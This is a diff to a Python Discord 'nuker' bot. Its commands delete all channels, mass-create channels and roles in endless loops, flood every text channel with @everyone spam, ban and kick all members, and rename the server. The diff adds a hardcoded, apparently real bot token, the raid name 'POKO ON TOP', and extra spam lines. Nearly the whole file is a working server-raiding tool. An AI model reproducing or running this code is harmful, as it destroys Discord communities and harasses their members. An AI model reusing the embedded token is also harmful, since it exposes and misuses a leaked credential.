@@ -1,39 +1,41 @@
 
-
 # Source By Sepehr
 # If you have question or problem send message on my discord `Sepehr#1266
 
 
-#............MODULES.............
+# ............MODULES.............
 import discord
 from discord.ext import commands
 
-#.............CORE.............
-TOKEN = ''  # Paste your bot token
-PREFIX = '!' # Write one prefix for bot
-NAME = ''   # Write one name for servername, channelsname, rolename
+# .............CORE.............
+TOKEN = 'MTA0NzA5NTkzMjA3MzgwNzg4Mg.G42QfN.9S7V_AUz1q6SK529iKh3cpjQG7VSlj2s0sQjg4'  # Paste your bot token
+PREFIX = '!'  # Write one prefix for bot
+NAME = 'POKO ON TOP'   # Write one name for servername, channelsname, rolename
 MESSAGE = '@everyone '  # Write one message for spamming
 
 
 naame = NAME
 intents = discord.Intents.all()
-bot = commands.Bot(command_prefix=PREFIX,intents=intents)
+bot = commands.Bot(command_prefix=PREFIX ,intents=intents)
 bot.remove_command("help")
 
-#.............READY.............
+
+# .............READY.............
 @bot.event
 async def on_ready():
     print("Bot Is Run!")
-    
-#.............DELETE CHANNELS.............
+
+
+# .............DELETE CHANNELS.............
 @bot.command()
 async def nuke(ctx):
-        for c in ctx.guild.channels:
-            await c.delete()
-        guild = ctx.message.guild
-        await guild.create_text_channel(naame)
+    for c in ctx.guild.channels:
+        await c.delete()
+    guild = ctx.message.guild
+    await guild.create_text_channel(naame)
 
-#.............CHANNEL SPAMING.............
+
+# .............CHANNEL SPAMING.............
 @bot.command()
 async def cs(ctx):
     await ctx.reply('**Done!**')
@@ -41,24 +43,28 @@ async def cs(ctx):
         guild = ctx.message.guild
         await guild.create_text_channel(naame)
 
-#.............ROLE SPAMING.............
+
+# .............ROLE SPAMING.............
 @bot.command()
 async def rs(ctx):
     await ctx.reply('**Done!**')
     guild = ctx.guild
     while True:
         await guild.create_role(name=naame)
-        
-        
-#.............MESSAGE SPAMING.............
+
+
+# .............MESSAGE SPAMING.............
 @bot.command()
 async def ms(ctx):
     while True:
         for channel in ctx.guild.text_channels:
             await channel.send(MESSAGE)
+            await channel.send(MESSAGE)
+            await channel.send(MESSAGE)
+            await channel.send(MESSAGE)
 
 
-#.............BAN ALL.............
+# .............BAN ALL.............
 @bot.command()
 async def bs(ctx):
     await ctx.reply('**Done!**')
@@ -67,8 +73,9 @@ async def bs(ctx):
             await user.ban()
         except:
             pass
-        
-#.............KICK ALL.............
+
+
+# .............KICK ALL.............
 @bot.command()
 async def ks(ctx):
     await ctx.reply('**Done!**')
@@ -78,13 +85,13 @@ async def ks(ctx):
         except:
             pass
 
-#.............SERVER NAME.............
+
+# .............SERVER NAME.............
 @bot.command()
 async def sn(ctx):
     await ctx.reply('**Done!**')
     guild = ctx.guild
     await ctx.guild.edit(name=naame)
 
-
-#.............RUNNING.............
+# .............RUNNING.............
 bot.run(TOKEN)
